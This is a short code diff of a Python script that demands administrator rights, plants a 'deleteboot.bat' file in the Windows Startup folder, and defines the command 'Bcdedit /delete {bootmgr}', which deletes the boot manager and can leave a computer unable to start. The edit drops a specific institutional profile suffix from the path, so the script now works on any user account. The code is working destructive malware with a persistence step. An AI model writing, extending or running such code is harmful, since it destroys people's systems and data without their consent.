@@ -7,7 +7,7 @@ from pyuac import main_requires_admin
 @main_requires_admin
 def main():
     user = os.getlogin()
-    caminho = os.path.join('C:\\', 'Users', user + '.EDU_FIESC', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'deleteboot.bat')
+    caminho = os.path.join('C:\\', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'deleteboot.bat')
 
     comando = r'Bcdedit /delete {bootmgr}'
 
